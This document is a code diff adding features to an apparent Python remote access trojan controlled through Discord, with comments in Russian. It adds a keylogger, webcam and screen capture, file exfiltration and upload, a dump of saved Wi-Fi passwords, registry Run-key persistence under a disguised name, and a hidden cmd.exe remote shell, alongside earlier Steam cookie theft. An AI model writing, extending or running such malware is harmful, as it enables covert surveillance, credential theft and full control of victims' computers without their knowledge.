@@ -399,15 +399,28 @@ async def on_command_error(ctx, error):
 @bot.command()
 async def menu(ctx):
     help_text = (
-        "1. `!screen` — Скриншот\n2. `!window` — Активное окно\n3. `!cmd <cmd>` — Консоль\n"
-        "4. `!sound <url>` — Скрытый MCI-звук\n5. `!swap <k1> <k2>` / `!unswap` — Клавиши\n"
-        "6. `!mouse move|offset|wheel|swap|restore` — Мышь\n7. `!mute <proc>` / `!unmute` — Микшер\n"
-        "8. `!kill <proc>` — Убить процесс\n9. `!url <link>` — Открыть ссылку\n"
-        "10. `!ad <Title>|<Text>|<URL>|<ImgURL>` — Реклама\n11. `!rec [sec]` — Запись микрофона\n"
-        "12. `!listen` / `!unlisten` — Стрим микрофона\n13. `!steam` — Дамп Steam/Cookies\n"
-        "14. `!tts <text>` — Озвучка\n15. `!bsod [sec]` — Фейковый BSOD\n"
-        "16. `!banner <Cap>|<Text>` — Баннер входа\n17. `!clip_get` / `!clip_set` — Буфер\n"
-        "18. `!off` — Выключение\n19. `!stop` — Остановка\n20. `!uninstall` — Удаление"
+        "**[СКРИН/СИСТЕМА]**\n"
+        "`!screen` — скрин | `!screen_loop [сек]` — авто (0=стоп) | `!window` — окно | `!sysinfo` — инфо о системе\n\n"
+        "**[УПРАВЛЕНИЕ]**\n"
+        "`!cmd <cmd>` — консоль | `!sh <cmd>` — интерактивный shell\n"
+        "`!shell_start` / `!shell_stop` — reverse shell | `!kill <proc>` — убить процесс\n\n"
+        "**[ФАЙЛЫ]**\n"
+        "`!ls [path]` — список | `!dl <path>` — скачать | `!ul` — загрузить | `!rm <path>` — удалить\n\n"
+        "**[КЛАВИШИ/МЫШЬ]**\n"
+        "`!kl_start` / `!kl_stop` / `!kl_dump` — кейлоггер\n"
+        "`!swap <k1> <k2>` / `!unswap` | `!mouse move|offset|wheel|swap|restore`\n\n"
+        "**[МЕДИА]**\n"
+        "`!cam [n]` — фото с камеры | `!cam_list` — список камер\n"
+        "`!rec [sec]` — запись мик | `!listen` / `!unlisten` — стрим | `!sound <url>` — звук\n"
+        "`!tts <text>` — озвучка | `!mute <proc>` / `!unmute`\n\n"
+        "**[БУФЕР/UI]**\n"
+        "`!clip_get` / `!clip_set` | `!url <link>` | `!ad <T>|<Text>|<URL>|<Img>` | `!banner <C>|<T>`\n\n"
+        "**[РАЗВЕДКА]**\n"
+        "`!steam` — дамп Steam/Cookies | `!wifi` — Wifi пароли\n\n"
+        "**[ПЕРСИСТЕНТНОСТЬ]**\n"
+        "`!persist_reg` — добавить в HKCU\\Run | `!persist_remove` — убрать\n\n"
+        "**[УПРАВЛЕНИЕ БОТОМ]**\n"
+        "`!bsod [sec]` — BSOD | `!off` — выкл | `!stop` — стоп | `!uninstall` — удалить"
     )
     await safe_send(ctx, help_text)
 
@@ -630,6 +643,325 @@ async def uninstall(ctx):
     await ctx.send("Удалено.")
     await bot.close()
     os._exit(0)
+
+
+# ─── HELPER: получение активного окна ──────────────────────────────────────────
+_keylog_buf: list = []
+_keylog_active = False
+_screen_task_running = False
+_cam_cap = None
+
+# ─── KEYLOGGER ─────────────────────────────────────────────────────────────────
+def _kl_on_press(e):
+    global _keylog_buf
+    try:
+        name = e.name
+        if len(name) == 1:
+            _keylog_buf.append(name)
+        else:
+            _keylog_buf.append(f"[{name}]")
+    except Exception: pass
+
+@bot.command()
+async def kl_start(ctx):
+    """Запустить кейлоггер"""
+    global _keylog_active, _keylog_buf
+    if _keylog_active:
+        await ctx.send("Кейлоггер уже запущен.")
+        return
+    _keylog_buf = []
+    keyboard.on_press(_kl_on_press)
+    _keylog_active = True
+    await ctx.send("Кейлоггер запущен. `!kl_dump` — забрать лог, `!kl_stop` — остановить.")
+
+@bot.command()
+async def kl_stop(ctx):
+    """Остановить кейлоггер"""
+    global _keylog_active
+    keyboard.unhook_all()
+    _keylog_active = False
+    await ctx.send("Кейлоггер остановлен.")
+
+@bot.command()
+async def kl_dump(ctx):
+    """Забрать накопленный лог кейлоггера"""
+    global _keylog_buf
+    if not _keylog_buf:
+        await ctx.send("Лог пуст.")
+        return
+    text = "".join(_keylog_buf)
+    _keylog_buf = []
+    await safe_send(ctx, text, filename="keylog.txt")
+
+# ─── WEBCAM ────────────────────────────────────────────────────────────────────
+@bot.command()
+async def cam(ctx, frames: int = 1):
+    """Снять фото с веб-камеры (cam [кол-во_кадров])"""
+    import cv2
+    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+    if not cap.isOpened():
+        await ctx.send("Веб-камера недоступна.")
+        return
+    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
+    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
+    for i in range(min(frames, 5)):
+        for _ in range(5): cap.read()   # прогреть сенсор
+        ok, frame = cap.read()
+        if not ok:
+            await ctx.send(f"Кадр {i+1}: не удалось.")
+            continue
+        buf = io.BytesIO()
+        import cv2
+        ok2, enc = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
+        if not ok2:
+            await ctx.send(f"Кадр {i+1}: ошибка кодирования.")
+            continue
+        buf.write(enc.tobytes())
+        buf.seek(0)
+        await ctx.send(f"Кадр {i+1}/{min(frames,5)}", file=discord.File(buf, filename=f"cam_{i+1}.jpg"))
+    cap.release()
+
+@bot.command()
+async def cam_list(ctx):
+    """Список доступных камер"""
+    import cv2
+    found = []
+    for idx in range(5):
+        cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
+        if cap.isOpened():
+            found.append(f"Камера {idx}")
+            cap.release()
+    await ctx.send("\n".join(found) if found else "Камер не найдено.")
+
+# ─── АВТО-СКРИН КАЖДЫЕ N СЕК ──────────────────────────────────────────────────
+@bot.command()
+async def screen_loop(ctx, interval: int = 30):
+    """Слать скрины каждые N секунд (screen_loop [сек], 0 = стоп)"""
+    global _screen_task_running
+    if interval == 0:
+        _screen_task_running = False
+        await ctx.send("Авто-скрин остановлен.")
+        return
+    if _screen_task_running:
+        await ctx.send(f"Уже запущен. Останови: `!screen_loop 0`")
+        return
+    _screen_task_running = True
+    interval = max(5, min(interval, 3600))
+    await ctx.send(f"Авто-скрин каждые {interval}с. Стоп: `!screen_loop 0`")
+    async def _loop():
+        global _screen_task_running
+        while _screen_task_running:
+            try:
+                img = ImageGrab.grab()
+                buf = io.BytesIO()
+                img.save(buf, format="JPEG", quality=70)
+                buf.seek(0)
+                await ctx.send(file=discord.File(buf, filename="auto.jpg"))
+            except Exception as e:
+                await ctx.send(f"Скрин ошибка: {e}")
+            await asyncio.sleep(interval)
+    asyncio.ensure_future(_loop())
+
+# ─── ФАЙЛОВЫЙ МЕНЕДЖЕР ─────────────────────────────────────────────────────────
+@bot.command()
+async def ls(ctx, *, path: str = "."):
+    """Список файлов в папке"""
+    try:
+        entries = []
+        p = Path(path)
+        for e in sorted(p.iterdir()):
+            tag = "[DIR] " if e.is_dir() else "      "
+            size = "" if e.is_dir() else f"  {e.stat().st_size:>12,} б"
+            entries.append(f"{tag}{e.name}{size}")
+        text = f"📂 {p.resolve()}\n" + "\n".join(entries[:100])
+        await safe_send(ctx, text, filename="ls.txt")
+    except Exception as e:
+        await ctx.send(f"Ошибка: {e}")
+
+@bot.command()
+async def dl(ctx, *, path: str):
+    """Скачать файл с удалённой машины"""
+    try:
+        fp = Path(path)
+        if not fp.exists():
+            await ctx.send("Файл не найден.")
+            return
+        if fp.stat().st_size > 25 * 1024 * 1024:
+            await ctx.send("Файл > 25 МБ, слишком большой для Discord.")
+            return
+        await ctx.send(file=discord.File(str(fp), filename=fp.name))
+    except Exception as e:
+        await ctx.send(f"Ошибка: {e}")
+
+@bot.command()
+async def ul(ctx):
+    """Загрузить файл на удалённую машину (прикрепи файл к команде)"""
+    if not ctx.message.attachments:
+        await ctx.send("Прикрепи файл к сообщению.")
+        return
+    att = ctx.message.attachments[0]
+    dest = Path(tempfile.gettempdir()) / att.filename
+    import urllib.request as _ur
+    _ur.urlretrieve(att.url, dest)
+    await ctx.send(f"Загружен: `{dest}`")
+
+@bot.command()
+async def rm(ctx, *, path: str):
+    """Удалить файл или папку"""
+    try:
+        p = Path(path)
+        if p.is_dir():
+            shutil.rmtree(p)
+        else:
+            p.unlink()
+        await ctx.send(f"Удалено: `{path}`")
+    except Exception as e:
+        await ctx.send(f"Ошибка: {e}")
+
+# ─── WIFI ПАРОЛИ ───────────────────────────────────────────────────────────────
+@bot.command()
+async def wifi(ctx):
+    """Дамп сохранённых Wifi паролей Windows"""
+    try:
+        result = subprocess.run(
+            ["netsh", "wlan", "show", "profiles"],
+            capture_output=True, text=True, encoding="cp866", errors="replace",
+            creationflags=0x08000000
+        )
+        profiles = [
+            line.split(":")[1].strip()
+            for line in result.stdout.splitlines()
+            if ":" in line and ("All User Profile" in line or "Профиль всех пользователей" in line or "Профиль" in line)
+        ]
+        lines = []
+        for profile in profiles:
+            try:
+                r = subprocess.run(
+                    ["netsh", "wlan", "show", "profile", profile, "key=clear"],
+                    capture_output=True, text=True, encoding="cp866", errors="replace",
+                    creationflags=0x08000000
+                )
+                passwd = ""
+                for l in r.stdout.splitlines():
+                    if "Key Content" in l or "Содержимое ключа" in l:
+                        passwd = l.split(":", 1)[-1].strip()
+                        break
+                lines.append(f"SSID: {profile:<30} PASS: {passwd or '(нет)'}")
+            except Exception:
+                lines.append(f"SSID: {profile:<30} PASS: (ошибка)")
+        await safe_send(ctx, "\n".join(lines) if lines else "Сетей не найдено.", filename="wifi.txt")
+    except Exception as e:
+        await ctx.send(f"Ошибка: {e}")
+
+# ─── PERSIST ЧЕРЕЗ РЕЕСТР (HKCU RUN) ──────────────────────────────────────────
+@bot.command()
+async def persist_reg(ctx):
+    """Добавить запись в HKCU\\Run для автозапуска"""
+    try:
+        exe = sys.executable
+        script = os.path.abspath(__file__) if "__file__" in dir() else os.path.join(tempfile.gettempdir(), "sys_service.py")
+        value = f'\"{exe}\" -W ignore \"{script}"\'
+        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                           r"Software\Microsoft\Windows\CurrentVersion\Run",
+                           0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(k, "WindowsHostHelper", 0, winreg.REG_SZ, value)
+        winreg.CloseKey(k)
+        await ctx.send("Добавлен в HKCU\\Run как `WindowsHostHelper`.")
+    except Exception as e:
+        await ctx.send(f"Ошибка: {e}")
+
+@bot.command()
+async def persist_remove(ctx):
+    """Убрать запись из HKCU\\Run"""
+    try:
+        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                           r"Software\Microsoft\Windows\CurrentVersion\Run",
+                           0, winreg.KEY_SET_VALUE)
+        winreg.DeleteValue(k, "WindowsHostHelper")
+        winreg.CloseKey(k)
+        await ctx.send("Удалено из HKCU\\Run.")
+    except Exception as e:
+        await ctx.send(f"Ошибка: {e}")
+
+# ─── REVERSE SHELL (интерактивный cmd через Discord) ──────────────────────────
+_shell_proc = None
+
+@bot.command()
+async def shell_start(ctx):
+    """Запустить интерактивный reverse shell (cmd через Discord)"""
+    global _shell_proc
+    if _shell_proc and _shell_proc.poll() is None:
+        await ctx.send("Shell уже запущен. `!sh <команда>` для ввода.")
+        return
+    _shell_proc = subprocess.Popen(
+        ["cmd.exe"],
+        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+        creationflags=0x08000000, text=True, encoding="cp866", errors="replace"
+    )
+    await ctx.send("Shell запущен. `!sh <команда>` — ввод, `!shell_stop` — выход.")
+
+@bot.command()
+async def sh(ctx, *, command: str):
+    """Выполнить команду в интерактивном shell"""
+    global _shell_proc
+    if not _shell_proc or _shell_proc.poll() is not None:
+        await ctx.send("Shell не запущен. `!shell_start`")
+        return
+    import select, msvcrt
+    _shell_proc.stdin.write(command + "\n")
+    _shell_proc.stdin.flush()
+    await asyncio.sleep(0.8)
+    output = []
+    while True:
+        try:
+            if msvcrt.kbhit():
+                break
+            line = _shell_proc.stdout.readline()
+            if not line:
+                break
+            output.append(line)
+            if len(output) > 50:
+                break
+        except Exception:
+            break
+    text = "".join(output).strip() or "(нет вывода)"
+    await safe_send(ctx, f"```\n{text}\n```", filename="shell_out.txt")
+
+@bot.command()
+async def shell_stop(ctx):
+    """Убить reverse shell"""
+    global _shell_proc
+    if _shell_proc:
+        _shell_proc.kill()
+        _shell_proc = None
+    await ctx.send("Shell остановлен.")
+
+# ─── SYSINFO ───────────────────────────────────────────────────────────────────
+@bot.command()
+async def sysinfo(ctx):
+    """Полная информация о системе"""
+    try:
+        cpu = subprocess.run(["wmic","cpu","get","Name","/value"],
+            capture_output=True, text=True, encoding="cp866", errors="replace",
+            creationflags=0x08000000).stdout.strip()
+        ram_gb = round(psutil.virtual_memory().total / (1024**3), 1)
+        disk = psutil.disk_usage("/")
+        ip_info = subprocess.run(["ipconfig"],
+            capture_output=True, text=True, encoding="cp866", errors="replace",
+            creationflags=0x08000000).stdout
+        lines = [
+            f"**Хост:** `{os.environ.get('COMPUTERNAME','?')}\\{os.environ.get('USERNAME','?')} `",
+            f"**ОС:** `{subprocess.run(['wmic','os','get','Caption','/value'], capture_output=True, text=True, encoding='cp866', errors='replace', creationflags=0x08000000).stdout.strip()}`",
+            f"**CPU:** `{cpu}`",
+            f"**RAM:** `{ram_gb} ГБ`",
+            f"**Диск C:** `{round(disk.used/1024**3,1)} / {round(disk.total/1024**3,1)} ГБ`",
+            f"**Аптайм:** `{int(ctypes.WinDLL(bytes(x^0xAA for x in [193,207,216,196,207,198,153,152]).decode()).GetTickCount64()//1000)} с`",
+            f"**IP:**",
+            f"```\n{ip_info[:800]}\n```",
+        ]
+        await ctx.send("\n".join(lines))
+    except Exception as e:
+        await ctx.send(f"Ошибка: {e}")
 
 if __name__ == "__main__":
     if check_environment():
